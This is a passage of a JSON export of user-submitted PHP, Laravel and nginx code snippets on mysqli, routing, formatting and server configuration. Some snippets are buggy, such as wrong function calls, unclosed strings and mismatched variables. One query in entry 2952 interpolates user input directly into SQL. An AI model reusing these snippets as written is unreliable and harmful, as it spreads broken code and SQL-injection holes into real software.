    "description": "<?php $enlace = mysqli_connect(\"127.0.0.1\", \"mi_usuario\", \"mi_contrase&ntilde;a\", \"mi_bd\");  if (!$enlace) {     echo \"Error: No se pudo conectar a MySQL.\" . PHP_EOL;     echo \"errno de depuraci&oacute;n: \" . mysqli_connect_errno() . PHP_EOL;     echo \"error de depuraci&oacute;n: \" . mysqli_connect_error() . PHP_EOL;     exit; }  echo \"&Eacute;xito: Se realiz&oacute; una conexi&oacute;n apropiada a MySQL! La base de datos mi_bd es genial.\" . PHP_EOL; echo \"Informaci&oacute;n del host: \" . mysqli_get_host_info($enlace) . PHP_EOL;  mysqli_close($enlace); ?>\n $mysqli = new mysqli(host, username, password, dbname, port, socket)\nmysqli_connect(host, username, password, dbname, port, socket)\n <?php $mysqli = new mysqli(\"localhost\",\"my_user\",\"my_password\",\"my_db\");  // Check connection if ($mysqli -> connect_errno) {    echo \"Failed to connect to MySQL: \" . $mysqli -> connect_error;      exit();    } ?>\n<?php; $db_handle = mysqli_connect($db_server_name, $db_user_name, $db_password); ?>\n// mysqli_connect is an alias of mysqli::__construct() $mysqli = new mysqli(\"host\", \"user\", \"password\", \"database\", 'port', 'socket');\n",
    "reg_date": "2021-10-12T10:17:09.000Z"
  },
  {
    "id": 2947,
    "keyword": null,
    "link": null,
    "title": " mysqli connect php",
    "description": "<?php $enlace = mysqli_connect(\"127.0.0.1\", \"mi_usuario\", \"mi_contrase&ntilde;a\", \"mi_bd\");  if (!$enlace) {     echo \"Error: No se pudo conectar a MySQL.\" . PHP_EOL;     echo \"errno de depuraci&oacute;n: \" . mysqli_connect_errno() . PHP_EOL;     echo \"error de depuraci&oacute;n: \" . mysqli_connect_error() . PHP_EOL;     exit; }  echo \"&Eacute;xito: Se realiz&oacute; una conexi&oacute;n apropiada a MySQL! La base de datos mi_bd es genial.\" . PHP_EOL; echo \"Informaci&oacute;n del host: \" . mysqli_get_host_info($enlace) . PHP_EOL;  mysqli_close($enlace); ?>\n $mysqli = new mysqli(host, username, password, dbname, port, socket)\nmysqli_connect(host, username, password, dbname, port, socket)\n <?php $mysqli = new mysqli(\"localhost\",\"my_user\",\"my_password\",\"my_db\");  // Check connection if ($mysqli -> connect_errno) {    echo \"Failed to connect to MySQL: \" . $mysqli -> connect_error;      exit();    } ?>\n<?php; $db_handle = mysqli_connect($db_server_name, $db_user_name, $db_password); ?>\n// mysqli_connect is an alias of mysqli::__construct() $mysqli = new mysqli(\"host\", \"user\", \"password\", \"database\", 'port', 'socket');\n",
    "reg_date": "2021-10-12T10:17:09.000Z"
  },
  {
    "id": 2948,
    "keyword": null,
    "link": null,
    "title": " mysqli escape string",
    "description": "$conn->real_escape_string($var);\n",
    "reg_date": "2021-10-12T10:17:09.000Z"
  },
  {
    "id": 2949,
    "keyword": null,
    "link": null,
    "title": " mysqli fetch row assoc",
    "description": "<?php \t/* Connect to your database */ \t$con = mysqli_query(\"hostname\", \"username\", \"pwd\", \"database\");     /* Select Columns from table*/     $sql = \"SELECT * FROM `TABLE`\";     /* Query your SQL code to SQLDatabase */     $result = mysqli_query($con, $sql);     /* Find rows in table*/     $check = mysqli_num_rows($result);     if($check > 0){     while($data= mysqli_fetch_assoc($result)){     /* Print all of your data*/     echo $data[\"ColName\"];     }     } ?>\n<?php $mysqli = new mysqli(\"localhost\", \"my_user\", \"my_password\", \"world\");  /* check connection */ if ($mysqli->connect_errno) {     printf(\"Connect failed: %s\\n\", $mysqli->connect_error);     exit(); }  $query = \"SELECT Name, CountryCode FROM City ORDER by ID DESC LIMIT 50,5\";  if ($result = $mysqli->query($query)) {      /* fetch associative array */     while ($row = $result->fetch_assoc()) {         printf (\"%s (%s)\\n\", $row[\"Name\"], $row[\"CountryCode\"]);     }      /* free result set */     $result->free(); }  /* close connection */ $mysqli->close(); ?>\n$sql = \"SELECT Lastname, Age FROM Persons ORDER BY Lastname\"; $result = mysqli_query($con, $sql);   /*MYSQLI_ASSOC MYSQLI_NUM (this is default) MYSQLI_BOTH   */ // Fetch all mysqli_fetch_all($result, MYSQLI_ASSOC); \n",
    "reg_date": "2021-10-12T10:17:09.000Z"
  },
  {
    "id": 2950,
    "keyword": null,
    "link": null,
    "title": " mysqli last index php",
    "description": "$last_id_inserted = mysqli_insert_id($conn);\n",
    "reg_date": "2021-10-12T10:17:09.000Z"
  },
  {
    "id": 2951,
    "keyword": null,
    "link": null,
    "title": " mysqli open and close connection",
    "description": "// Creating connection $conn = mysqli_connect(\"localhost\", \"username\", \"password\"); // closing connection mysqli_close($conn);\n",
    "reg_date": "2021-10-12T10:17:10.000Z"
  },
  {
    "id": 2952,
    "keyword": null,
    "link": null,
    "title": " mysqli query in php",
    "description": " $con = mysqli_connect('localhost','root','','db_name');  $sql2 = mysqli_query($con,\"SELECT * FROM users WHERE email={'$email'}\");          \n$con = mysqli_connect('localhost','root','','db_name'); $sql2 = mysqli_query($con,\"SELECT * FROM users WHERE email={'$email'}\");          \n",
    "reg_date": "2021-10-12T10:17:10.000Z"
  },
  {
    "id": 2953,
    "keyword": null,
    "link": null,
    "title": " mysqli real connect(): (hy000/2002): no such file or directory",
    "description": "Locate config.sample.inc.php  Change  $cfg['Servers'][$i]['host'] = 'localhost'; into  $cfg['Servers'][$i]['host'] = '127.0.0.1'; Save.  Then rename the file and remove sample from the name.\n",
    "reg_date": "2021-10-12T10:17:10.000Z"
  },
  {
    "id": 2954,
    "keyword": null,
    "link": null,
    "title": " mysqli real escape string php",
    "description": "The real_escape_string() / mysqli_real_escape_string() function escapes special characters in a string for use in an SQL query, taking into account the current character set of the connection.  Object oriented style: $mysqli -> real_escape_string(escapestring)   $mysqli = new mysqli(\"localhost\",\"my_user\",\"my_password\",\"my_db\");  // Escape special characters, if any $firstname = $mysqli -> real_escape_string($_POST['firstname']); $lastname = $mysqli -> real_escape_string($_POST['lastname']); $age = $mysqli -> real_escape_string($_POST['age']);  Procedural style: mysqli_real_escape_string(connection, escapestring)    $con = mysqli_connect(\"localhost\",\"my_user\",\"my_password\",\"my_db\");  // Escape special characters, if any $firstname = mysqli_real_escape_string($con, $_POST['firstname']); $lastname = mysqli_real_escape_string($con, $_POST['lastname']); $age = mysqli_real_escape_string($con, $_POST['age']);\n$someString = var_export($anyVariable, true);\n <?php  mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT); $mysqli = mysqli_connect(\"localhost\", \"my_user\", \"my_password\", \"world\");  $city = \"'s-Hertogenbosch\";  /* this query with escaped $city will work */ $query = sprintf(\"SELECT CountryCode FROM City WHERE name='%s'\",     mysqli_real_escape_string($mysqli, $city)); $resu = mysqli_query($mysqli, $query); printf(\"Select returned %d rows.\\n\", mysqli_num_rows($result));  /* this query will fail, because we didn't escape $city */ $query = sprintf(\"SELECT CountryCode FROM City WHERE name='%s'\", $city); $result = mysqli_query($mysqli, $query);  \njQuery(document).ready(function($){      // hide messages      $(\"#error\").hide();     $(\"#sent-form-msg\").hide();      // on submit...     $(\"#contactForm #submit\").click(function() {         $(\"#error\").hide();          //required:          //name         var name = $(\"input#name\").val();         if(name == \"\"){             $(\"#error\").fadeIn().text(\"Name required.\");             $(\"input#name\").focus();             return false;         }          // email         var email = $(\"input#email\").val();         if(email == \"\"){             $(\"#error\").fadeIn().text(\"Email required\");             $(\"input#email\").focus();             return false;         }          // contact_no         var contact_no = $(\"input#contact_no\").val();         if(contact_no == \"\"){             $(\"#error\").fadeIn().text(\"Contact number required\");             $(\"input#contact_no\").focus();             return false;         }          // comments         var comments = $(\"#comments\").val();           // data string         var dataString = 'name='+ name                         + '&email=' + email                                 + '&contact_no=' + contact_no                         + '&comments=' + comments          // ajax         $.ajax({             type:\"POST\",             data: dataString,             success: success()         });     });         // on success...      function success(){         $(\"#sent-form-msg\").fadeIn();         $(\"#contactForm\").fadeOut();      }      return false; }); \n",
    "reg_date": "2021-10-12T10:17:10.000Z"
  },
  {
    "id": 2955,
    "keyword": null,
    "link": null,
    "title": " mysqli set utf8 encoding",
    "description": "<?php $mysqli = new mysqli(\"localhost\",\"my_user\",\"my_password\",\"my_db\");  if ($mysqli -> connect_errno) {   echo \"Failed to connect to MySQL: \" . $mysqli -> connect_error;   exit(); }  echo \"Initial character set is: \" . $mysqli -> character_set_name();  // Change character set to utf8 $mysqli -> set_charset(\"utf8\");  echo \"Current character set is: \" . $mysqli -> character_set_name();  $mysqli -> close(); ?>\n",
    "reg_date": "2021-10-12T10:17:10.000Z"
  },
  {
    "id": 2956,
    "keyword": null,
    "link": null,
    "title": " n months from today php",
    "description": "$effectiveDate = date('Y-m-d', strtotime(\"+3 months\", strtotime($effectiveDate)));\n",
    "reg_date": "2021-10-12T10:17:10.000Z"
  },
  {
    "id": 2957,
    "keyword": null,
    "link": null,
    "title": " name csrf token laravel mismatch",
    "description": "<meta name=\"csrf-token\" content=\"{{ csrf_token() }}\" />\n<input type=\"hidden\" name=\"_token\" id=\"token\" value=\"{{ csrf_token() }}\"> \n",
    "reg_date": "2021-10-12T10:17:10.000Z"
  },
  {
    "id": 2958,
    "keyword": null,
    "link": null,
    "title": " name of today php",
    "description": "$dayofweek = date('w', strtotime($date)); $result    = date('Y-m-d', strtotime(($day - $dayofweek).' day', strtotime($date)));\ndate(\"l\",time()) // LOWER CASE L \n$datetime = DateTime::createFromFormat('YmdHi', '201308131830'); echo $datetime->format('D');  // or   $date = new \\DateTime(); echo $date->format(\"D\");  \n",
    "reg_date": "2021-10-12T10:17:10.000Z"
  },
  {
    "id": 2959,
    "keyword": null,
    "link": null,
    "title": " named route with parameter laravel",
    "description": "<form method=\"POST\" action=\"{{ route('route.name', [ 'id'=> $item->id ]) }}\">               @csrf               <input type=\"hidden\" name=\"_method\" value=\"DELETE\">               <button type=\"submit\" class=\"btn btn-danger btn-icon\">                 <i data-feather=\"delete\"></i>               </button>             </form>\nRoute::get('/menu/{category}/{product}/{item}', ['as' => 'named.route' , 'uses' => 'MenuController@listItem']);  // to get the actual linke route('named.route', ['category' => $category->id, 'product' => $product->id, 'item' => $item->id]);\nRoute::get('/novanoticia', 'HomeController@getNovaNoticia')->name('route_name'); Route::get('/novanoticia', ['as' => 'route_name', 'uses' => 'HomeController@getNovaNoticia']); \nRoute::get('user/{id}', function ($id) {     return 'User '.$id; });\n# Using Request Route::get('user/{name}', function (Request $request) {     return $request->route('name'); });\nRoute::view('/welcome', 'welcome');  Route::view('/welcome', 'welcome', ['name' => 'Taylor']);\n",
    "reg_date": "2021-10-12T10:17:10.000Z"
  },
  {
    "id": 2960,
    "keyword": null,
    "link": null,
    "title": " nested resources laravel",
    "description": "Sometimes you may need to define routes to a nested resource.  For example, a photo resource may have multiple comments that may be attached to the photo. To nest the resource controllers,  you may use \"dot\" notation in your route declaration:  Route::resource('photos.comments', PhotoCommentController::class); //return Route : /photos/{photo}/comments/{comment}\n",
    "reg_date": "2021-10-12T10:17:10.000Z"
  },
  {
    "id": 2961,
    "keyword": null,
    "link": null,
    "title": " new line in php",
    "description": "<?php echo \"If you view the page source \\r\\n you will find a newline in this string.\"; echo \"<br>\"; echo nl2br(\"You will find the \\n newlines in this string \\r\\n on the browser window.\"); ?>   // 2 Way   <?php echo $clientid, ' ', $lastname, PHP_EOL;?>\n<?php echo \"Hello world this is example \\r\\n in php.\"; echo \"<br>\"; echo nl2br(\"You will find the \\n newlines in this string \\r\\n on the browser window.\"); ?>\n\"\\r\\n\"\n<?php  echo nl2br(\"If you want that '\\n' works. \\n Then use nl2br() function!\");  echo \"<br> can also be used.\";  echo \"nl2br() is in-built function whereas <br> is html tag\"; ?>\necho \"<br>\";\necho \"\\n\";\n",
    "reg_date": "2021-10-12T10:17:11.000Z"
  },
  {
    "id": 2962,
    "keyword": null,
    "link": null,
    "title": " new line php",
    "description": "<?php echo \"If you view the page source \\r\\n you will find a newline in this string.\"; echo \"<br>\"; echo nl2br(\"You will find the \\n newlines in this string \\r\\n on the browser window.\"); ?>   // 2 Way   <?php echo $clientid, ' ', $lastname, PHP_EOL;?>\n<?php echo \"Hello world this is example \\r\\n in php.\"; echo \"<br>\"; echo nl2br(\"You will find the \\n newlines in this string \\r\\n on the browser window.\"); ?>\n\"\\r\\n\"\n<?php  echo nl2br(\"If you want that '\\n' works. \\n Then use nl2br() function!\");  echo \"<br> can also be used.\";  echo \"nl2br() is in-built function whereas <br> is html tag\"; ?>\necho \"<br>\";\necho \"\\n\";\n",
    "reg_date": "2021-10-12T10:17:11.000Z"
  },
  {
    "id": 2963,
    "keyword": null,
    "link": null,
    "title": " newline in php",
    "description": "<?php echo \"If you view the page source \\r\\n you will find a newline in this string.\"; echo \"<br>\"; echo nl2br(\"You will find the \\n newlines in this string \\r\\n on the browser window.\"); ?>   // 2 Way   <?php echo $clientid, ' ', $lastname, PHP_EOL;?>\n<?php echo \"Hello world this is example \\r\\n in php.\"; echo \"<br>\"; echo nl2br(\"You will find the \\n newlines in this string \\r\\n on the browser window.\"); ?>\n\"\\r\\n\"\n<?php  echo nl2br(\"If you want that '\\n' works. \\n Then use nl2br() function!\");  echo \"<br> can also be used.\";  echo \"nl2br() is in-built function whereas <br> is html tag\"; ?>\necho \"<br>\";\necho \"\\n\";\n",
    "reg_date": "2021-10-12T10:17:11.000Z"
  },
  {
    "id": 2964,
    "keyword": null,
    "link": null,
    "title": " nginx codeigniter remove index.php",
    "description": "<?php  #By default, the index.php file will be included in your URLs:    # Create a .htaccess file in your root folder and paste the below code  RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L] ?>\nRewriteEngine on RewriteCond $1 !^(index\\.php|resources|robots\\.txt) RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L,QSA] \n# Only for Nginx server location / {     try_files $uri $uri/ /index.php$is_args$args; }\n//find the below code    $config['index_page'] = \"index.php\"  //replace with the below code $config['index_page'] = \"\" \n",
    "reg_date": "2021-10-12T10:17:11.000Z"
  },
  {
    "id": 2965,
    "keyword": null,
    "link": null,
    "title": " nginx laravel configuration",
    "description": "server {     listen 80;     server_name example.com;     root /srv/example.com/public;      add_header X-Frame-Options \"SAMEORIGIN\";     add_header X-Content-Type-Options \"nosniff\";      index index.php;      charset utf-8;      location / {         try_files $uri $uri/ /index.php?$query_string;     }      location = /favicon.ico { access_log off; log_not_found off; }     location = /robots.txt  { access_log off; log_not_found off; }      error_page 404 /index.php;      location ~ \\.php$ {         fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;         fastcgi_param SCRIPT_FILENAME $realpath_root$fastcgi_script_name;         include fastcgi_params;     }      location ~ /\\.(?!well-known).* {         deny all;     } }\n# If you are using Nginx, the following directive in your site  # configuration will direct all requests to the index.php  # front controller:  location / {     try_files $uri $uri/ /index.php?$query_string; }\nlocation / {     try_files $uri $uri/ /index.php?$query_string; }\n",
    "reg_date": "2021-10-12T10:17:11.000Z"
  },
  {
    "id": 2966,
    "keyword": null,
    "link": null,
    "title": " nginx reverse proxy nextcloud",
    "description": "/** Add this to config.php (in /nextcloud/config/config.php) to make the nextcloud instance aware of being in a proxy and using correct information when making URLs **/  'trusted_proxies'   => ['172.0.0.1'],   'overwritehost'     => 'domain.com',   'overwriteprotocol' => 'https',   'overwritecondaddr' => '^172\\.0\\.0\\.1$', \n//This use case assumes you are using a docker container. //If not you can change the ip information too  server {     listen 80;     server_name domain.com;     return 301 https://$server_name$request_uri; }  server {     listen 443 ssl;     server_name domain.com ;  /**If you are using letsencrypt with default file locations Use \"certbot certonly -d domain.com\" to generate the ssl certs remember to turn off your nginx before generating ssl certs**/     ssl_certificate /etc/letsencrypt/live/domain.com/fullchain.pem;     ssl_certificate_key /etc/letsencrypt/live/domain.com/privkey.pem;      add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always;      ssl_session_cache shared:SSL:10m;     ssl_protocols TLSv1.2;     ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256';     ssl_prefer_server_ciphers on;      client_max_body_size 2048M;       location / { \tproxy_pass http://172.0.0.1:8080; \tproxy_set_header        Host $host; \tproxy_set_header        X-Real-IP $remote_addr; \tproxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for; \tproxy_set_header        X-Forwarded-Proto $scheme; \tproxy_read_timeout 300;     }      location /.well-known/carddav {     return 301 $scheme://$host/remote.php/dav;     }      location /.well-known/caldav {     return 301 $scheme://$host/remote.php/dav;     } \n",
    "reg_date": "2021-10-12T10:17:11.000Z"
  },
  {
    "id": 2967,
    "keyword": null,
    "link": null,
    "title": " nl2br() php",
    "description": "because each OS have different ASCII chars for linebreak: windows = \\r\\n unix = \\n mac = \\r    <?php echo nl2br(\"foo isn't\\n bar\"); ?>\n// add to the functions file function translateLineBreaks($string) { \t$result = nl2br ($string);   \treturn $result; }\n",
    "reg_date": "2021-10-12T10:17:11.000Z"
  },
  {
    "id": 2968,
    "keyword": null,
    "link": null,
    "title": " nl2br php",
    "description": "$var = str_replace(array(\"\\r\\n\",\"\\n\"),'<br>', $var);\nbecause each OS have different ASCII chars for linebreak: windows = \\r\\n unix = \\n mac = \\r    <?php echo nl2br(\"foo isn't\\n bar\"); ?>\n// add to the functions file function translateLineBreaks($string) { \t$result = nl2br ($string);   \treturn $result; }\n",
    "reg_date": "2021-10-12T10:17:11.000Z"
  },
  {
    "id": 2969,
    "keyword": null,
    "link": null,
    "title": " non-numeric value encountered php",
    "description": "Not exactly the issue you had but the same error for people searching.  This happened to me when I spent too much time on JavaScript.  Coming back to PHP I concatenated two strings with \"+\" instead of \".\" and got that error.\n",
    "reg_date": "2021-10-12T10:17:11.000Z"
  },
  {
    "id": 2970,
    "keyword": null,
    "link": null,
    "title": " not equal in laravel blade",
    "description": "// !== \n",
    "reg_date": "2021-10-12T10:17:11.000Z"
  },
  {
    "id": 2971,
    "keyword": null,
    "link": null,
    "title": " npm watch laravel",
    "description": "npm run watch  // or, if can't detect local  changes npm run watch-poll\n",
    "reg_date": "2021-10-12T10:17:12.000Z"
  },
  {
    "id": 2972,
    "keyword": null,
    "link": null,
    "title": " null coalescing operator php",
    "description": "// The null coalescing operator (??) is used to replace the ternary operation // in conjunction with isset() function and returns its first operand if it // exists and is NOT NULL; otherwise it returns its second operand. $username = $_GET['username'] ?? 'not passed';  // Equivalent code using ternary operator $username = isset($_GET['username']) ? $_GET['username'] : 'not passed';\n// if $_POST['name'] doesn't exist $result will equal to John $result = $_POST['name'] ?? 'John';\n        $name = $_GET['name'] ?? $user_name ?: 'anonymous'; \n <?php // Fetches the value of $_GET['user'] and returns 'nobody' // if it does not exist. $username = $_GET['user'] ?? 'nobody'; // This is equivalent to: $username = isset($_GET['user']) ? $_GET['user'] : 'nobody';  // Coalescing can be chained: this will return the first // defined value out of $_GET['user'], $_POST['user'], and // 'nobody'. $username = $_GET['user'] ?? $_POST['user'] ?? 'nobody'; ?>  \n",
    "reg_date": "2021-10-12T10:17:12.000Z"
  },
  {
    "id": 2973,
    "keyword": null,
    "link": null,
    "title": " num rows in php",
    "description": "<?php  /* Explination  The mysqli_num_rows() function is an inbuilt function in PHP  which is used to return the number of rows present in the result set.  It is generally used to check if data is present in the database or not.  To use this function, it is mandatory to first set up the connection with the MySQL database. */ \t// Setting up connection with database Geeks  \t$con = mysqli_connect(\"localhost\", \"root\", \"\", \"testing\");  \t \t// Check connection  \tif (mysqli_connect_errno()) {  \t\techo \"Database connection failed.\";  \t}  \t// Fetch Query \t$query = \"SELECT Username, Password FROM users\";  \t \t// Execute the query and store the result set  \t$result = mysqli_query($con, $query);  \t \tif ($result) {  \t\t// it return number of rows in the table.  \t\t$row = mysqli_num_rows($result);  \t\tif ($row) {  \t\t\t \tprintf(\"Number of row in the table : \" . $row);  \t\t\t}  \t\t// close the result.  \t\tmysqli_free_result($result);  \t}   // Output : Number of row in the table : 5 ?>  \nmysqli_num_rows($result);\n// Fetch Query $query = \"SELECT user_name from registered_users where user_name like '%ank%'\";   // Execute the query and store the result set  $result = mysqli_query($con, $query);   if ($result) {    // it return number of rows in the table.    $row = mysqli_num_rows($result);  }\n//number of rows retrieved from a query <?php  $link = mysql_connect(\"localhost\", \"mysql_user\", \"mysql_password\"); mysql_select_db(\"database\", $link);  $result = mysql_query(\"SELECT * FROM table1\", $link); $num_rows = mysql_num_rows($result);  echo \"$num_rows Rows\\n\";  ?>  \n<?php  $link = mysql_connect(\"localhost\", \"mysql_user\", \"mysql_password\"); mysql_select_db(\"database\", $link);  $result = mysql_query(\"SELECT * FROM table1\", $link); $num_rows = mysql_num_rows($result);  echo \"$num_rows Zeilen\\n\";  ?>\n",
    "reg_date": "2021-10-12T10:17:12.000Z"
  },
  {
    "id": 2974,
    "keyword": null,
    "link": null,
    "title": " number format php",
    "description": "$num = 12345.6789; echo number_format($num, 2, '.', '') //12345.67 echo number_format($num, 3, ',', '.') //12.345,678\n<?php echo number_format(\"1000000\").\"<br>\"; echo number_format(\"1000000\",2).\"<br>\"; echo number_format(\"1000000\",2,\",\",\".\"); ?>\n// string number_format ($number, $decimals, $decimalpoint, $seperator)  // Enter the number you wish to format using decimals // to set the number of decimal places // You can replace the '.' with your own string // with the decimalpoint parameter. // With seperator, you can specify a string to be used // to seperate thousands.  $num = 123456.789; echo number_format($num); // 123,456 echo number_format($num, 4); // 123,456.7890 echo number_format($num, 4, '#'); // 123,456#7890 echo number_format($num, 5, '#', 'T'); // 123T456#78900\n $num = 12345.6789; echo number_format($num, 2, '.', '') //12345.67 echo number_format($num, 3, ',', '.') //12.345,678\nnumber_format($number);\n",
    "reg_date": "2021-10-12T10:17:12.000Z"
  },
  {
    "id": 2975,
    "keyword": null,
    "link": null,
    "title": " number format without comma php",
    "description": "number_format(1000.5, 2, '.', ''); \n",
    "reg_date": "2021-10-12T10:17:12.000Z"
  },
  {
    "id": 2976,
    "keyword": null,
    "link": null,
    "title": " number of rows in a mysql table pdo",
    "description": "//Instantiate the PDO object and connect to MySQL. $pdo = new PDO(     'mysql:host=127.0.0.1;dbname=my_database',     'username',     'password' );   //The COUNT SQL statement that we will use. $sql = \"SELECT COUNT(*) AS num FROM users\";   //Prepare the COUNT SQL statement. $stmt = $pdo->prepare($sql);   //Execute the COUNT statement. $stmt->execute();   //Fetch the row that MySQL returned. $row = $stmt->fetch(PDO::FETCH_ASSOC);   //The $row array will contain \"num\". Print it out. echo $row['num'] . ' users exist.'; \n",
    "reg_date": "2021-10-12T10:17:12.000Z"
  },
  {
    "id": 2977,
    "keyword": null,
    "link": null,
    "title": " numberformatter php",
    "description": "/* PHP class to format numbers, currencies, percentages et cetera according to the specified or default locale class. One must install and enable PHP intl extension to utilize the NumberFormatter class. */  $num = 1234567.891234567891;  $nf = new NumberFormatter('en_US', NumberFormatter::DECIMAL); echo $nf->format($num);  $nf = new NumberFormatter('uk_UA', NumberFormatter::CURRENCY); echo $nf->formatCurrency($num, 'UAH');  $nf = new NumberFormatter('lt_LT', NumberFormatter::SPELLOUT); echo $nf->format($num);  $nf = new NumberFormatter('en_US', NumberFormatter::DURATION); echo $nf->format($num);  $nf = new NumberFormatter('fr_FR', NumberFormatter::DECIMAL); $nf->setPattern('#,##0.### kg'); echo $nf->format($num);\n",
    "reg_date": "2021-10-12T10:17:12.000Z"
  },
  {
    "id": 2978,
    "keyword": null,
    "link": null,
    "title": " numbric validate laravel",
    "description": "$rules = ['Fno' => 'numeric|min:2|max:5', 'Lno' => 'numeric|min:2']; \n'item' => 'required|integer|between:1,10',\n/**  * Store a new blog post.  *  * @param  Request  $request  * @return Response  */ public function store(Request $request) {     $validatedData = $request->validate([         'title' => 'required|unique:posts|max:255',         'body' => 'required',     ]);      // The blog post is valid... }\n",
    "reg_date": "2021-10-12T10:17:12.000Z"
  },
  {
    "id": 2979,
    "keyword": null,
    "link": null,
    "title": " ob start in php",
    "description": "//why use ob_start() in php  <?php ob_start(); //Start remembering everything that would normally be outputted, but don't quite do anything with it yet $output = ob_get_contents(); //Gives whatever has been \"saved\" ob_end_clean(); //Stops saving things and discards whatever was saved ob_flush(); //Stops saving and outputs it all at once  ?>\nob_start(); //Start remembering everything that would normally be outputted, but don't quite do anything with it yet $output = ob_get_contents(); //Gives whatever has been \"saved\" ob_end_clean(); //Stops saving things and discards whatever was saved ob_flush(); //Stops saving and outputs it all at once\n<?php ob_start(); ?>  <div>     <p>Here go your view</p> </div>  <?php $content = ob_get_clean(); //now you can echo the content in base.php ?> <?php require( __DIR__ . './base.php'); ?>\n",
    "reg_date": "2021-10-12T10:17:12.000Z"
  },
  {
    "id": 2980,
    "keyword": null,
    "link": null,
    "title": " object not found in laravel xampp",
    "description": "php artisan storage:link\n",
    "reg_date": "2021-10-12T10:17:12.000Z"
  },
  {
    "id": 2981,
    "keyword": null,
    "link": null,
    "title": " object oriented programming php",
    "description": "<?php class Parent { \tpublic function __construct() {     \techo \"Parent Created\\n\";     }   \tpublic function sayHello() {     \techo \"Hello, from Parent\\n\";     }   \tpublic function eitherHello() {     \techo \"Hello, from Parent and child if desired\\n\";     } } class Child extends Parent { \tpublic function __construct() {     \techo \"Child Created\\n\";     }   \tpublic function sayHello() {     \techo \"Hello, from Child\\n\";     } } $p = new Parent();\t// Parent Created $c = new Child();\t// Child Created $p->sayHello(); \t// Hello, from Parent $c->sayHello();\t\t// Hello, from Child $p->eitherHello();\t// Hello, from Parent and child if desired $c->eitherHello();\t// Hello, from Parent and child if desired ?>\nThe  PHP Object-Oriented Programming concepts are: Class  Objects Inheritance Interface Abstraction Magic Methods\nWell Explained in here:  https://www.androidhive.info/2012/05/how-to-connect-android-with-php-mysql/ @Zenonymous\n<?php    class Mobile {       /* Member variables */       var $price;       var $title;       /* Member functions */       function setPrice($par){          $this->price = $par;       }       function getPrice(){          echo $this->price .\" \";       }       function setName($par){          $this->title = $par;       }       function getName(){          echo $this->title .\" \";       }    } $Samsung = new Mobile(); $Xiaomi = new Mobile(); $Iphone = new Mobile(); $Samsung->setName( \"SamsungS8 ); $Iphone->setName( \"Iphone7s\" ); $Xiaomi->setName( \"MI4\" ); $Samsung->setPrice( 90000 ); $Iphone->setPrice( 65000 ); $Xiaomi->setPrice( 15000 ); Now you call another member functions to get the values set by in above example $Samsung->getName(); $Iphone->getName(); $Xiaomi->getName(); $Samsung->getPrice(); $Iphone->getPrice(); $Xiaomi->getPrice(); ?> \npublic className{ \tpublic function __construct(){     //CODE HERE     } }\n",
    "reg_date": "2021-10-12T10:17:13.000Z"
  },
  {
    "id": 2982,
    "keyword": null,
    "link": null,
    "title": " object php",
    "description": "$x = new stdClass();\n//create a person object in PHP  $person=new stdClass();  $person->firstName=\"Chuck\";  $person->lastName=\"Bartowski\";  $person->age=27;    print_r($person);    \n   $object = new stdClass();    $object->property = 'Here we go';     var_dump($object);    /*    outputs:     object(stdClass)#2 (1) {       [\"property\"]=>       string(10) \"Here we go\"     }    */\n//object init   $object = (object) [     'propertyOne' => 'foo',     'propertyTwo' => 42,   ];\n$o= new \\stdClass(); $o->a = 'new object';  OR  $o = (object) ['a' => 'new object'];\n$a = array('foo' => 'bar'); $o = (object) $a; var_dump($o instanceof stdClass); // bool(true) var_dump($o->foo); // string(3) \"bar\"\n",
    "reg_date": "2021-10-12T10:17:13.000Z"
  },
  {
    "id": 2983,
    "keyword": null,
    "link": null,
    "title": " object to array php",
    "description": "//This works best $array = json_decode(json_encode($object), true);\n//It is verry  easy : just cast object to array $array =  (array)$object;\n$array = (array) $yourObject;\n$person = new stdClass(); $person->firstName = \"Taylor\"; $person->age = 32;  //Convert Single-Dimention Object to array $personArray = (array) $person;  //Convert Multi-Dimentional Object to Array $personArray = objectToArray($person); function objectToArray ($object) {     if(!is_object($object) && !is_array($object)){     \treturn $object;     }     return array_map('objectToArray', (array) $object); }\n// It will work Perfectly Fine. $arr = json_decode(json_encode($obj), true);\n$array = (array) $object;\n",
    "reg_date": "2021-10-12T10:17:13.000Z"
  },
  {
    "id": 2984,
    "keyword": null,
    "link": null,
    "title": " object to string php",
    "description": "(string)$yourObject;\n__toString() & {$this->name}\n",
    "reg_date": "2021-10-12T10:17:13.000Z"
  },
  {
    "id": 2985,
    "keyword": null,
    "link": null,
    "title": " object values to array php",
    "description": "//This works best $array = json_decode(json_encode($object), true);\n$array = (array) $yourObject;\n<?php  class sample {             /* Member variables */     var $var1;      var $var2;             function __construct( $par1, $par2 )       {          $this->var1 = $par1;          $this->var2 = $par2;      }  }     // Creating the object  $myObj = new sample(1000, \"second\");  echo \"Before conversion: \\n\";  var_dump($myObj);     // Converting object to associative array  $myArray = json_decode(json_encode($myObj), true);  echo \"After conversion: \\n\";  var_dump($myArray);  ?>     Output: Before conversion:  object(sample)#1 (2) {   [\"var1\"]=>   int(1000)   [\"var2\"]=>   string(6) \"second\" }  After conversion:  array(2) {   [\"var1\"]=>   int(1000)   [\"var2\"]=>   string(6) \"second\" }\narray_values(get_object_vars($object));\n",
    "reg_date": "2021-10-12T10:17:13.000Z"
  },
  {
    "id": 2986,
    "keyword": null,
    "link": null,
    "title": " oci execute(): ORA-01810: format code appears twice in",
